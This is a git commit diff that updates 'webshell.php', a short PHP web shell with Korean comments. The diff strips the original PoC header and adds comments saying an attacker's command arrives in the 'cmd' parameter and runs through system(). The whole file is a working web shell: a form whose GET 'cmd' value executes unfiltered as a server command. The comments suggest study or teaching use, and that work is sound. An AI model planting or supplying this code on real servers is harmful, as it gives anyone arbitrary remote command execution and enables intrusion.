7b2935502e3c2051cdfbd160bb97f520b1d11634
wkim0606 <33346320+wkim0606@users.noreply.github.com>
2023-08-21 17:22:46 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,21 +1,19 @@
 <?php
 
-//
-// PoC: a simple webshell 
-// Author: Bonghwan Choi
-// modified by WBOAN
-//
-echo '<br>'
-echo '<br>'
-echo '<center>명령어를 입력하세요 !!:<br>';
-echo '<br>'
+echo 'Enter a Command:<br>';
 echo '<form action="">';
 echo '<input type=text name="cmd">';
 echo '<input type="submit">';
-echo '</form>';
+echo '</form>';                                 
 
-if (isset($_GET['cmd'])) {
-	system($_GET['cmd']);
+/*
+        echo 부분은 명령어를 입력받을 수 있는 폼을 제공
+    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
+*/
+
+if(isset($_GET['cmd'])){
+        system($_GET['cmd']);
 }
+//system 함수를 통해 전달된 명령어가 실행된다.
 
 ?>
